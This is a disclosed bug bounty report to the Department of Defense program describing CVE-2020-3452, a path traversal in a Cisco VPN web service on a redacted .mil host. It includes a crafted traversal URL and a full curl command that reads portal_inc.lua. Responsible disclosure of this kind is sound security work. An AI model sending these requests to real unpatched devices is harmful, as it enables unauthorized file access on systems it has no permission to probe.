# [██████████.mil] Cisco VPN Service Path Traversal

## Report Details
- **Report ID**: 943717
- **URL**: https://hackerone.com/reports/943717
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-07-27T11:47:22.360Z
- **Disclosed**: 2020-10-16T19:48:27.895Z

## Reporter
- **Username**: arm4nd0
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi team. 
&nbsp;
# Summary

The Cisco VPN Service at ```██████.mil``` is vulnerable to the CVE-2020-3452 vulnerability, which allows path traversing within the web service's file system on the targeted device.


&nbsp;
# Steps to Reproduce
Make a GET request to:
```http
https://███████.mil/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
```

cURL command:
```
curl -i -s -k -X $'GET' \
    -H $'Host: █████.mil' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://█████.mil/+CSCOE+/logon.html?fcadbadd=1' -H $'DNT: 1' -H $'Connection: close' -H $'Cookie: webvpnlogin=1; webvpnLang=en' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'webvpnlogin=1; webvpnLang=en' \
    $'https://███.mil/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../'
```

..and get the content of the ```portal_inc.lua``` file.
███████

&nbsp;

## Impact

According to Cisco, this vulnerability cannot be used to obtain access to ASA or FTD system files or underlying operating system (OS) files, however, it has a CVE 7.5 (High) score.

## Attachments
No attachments
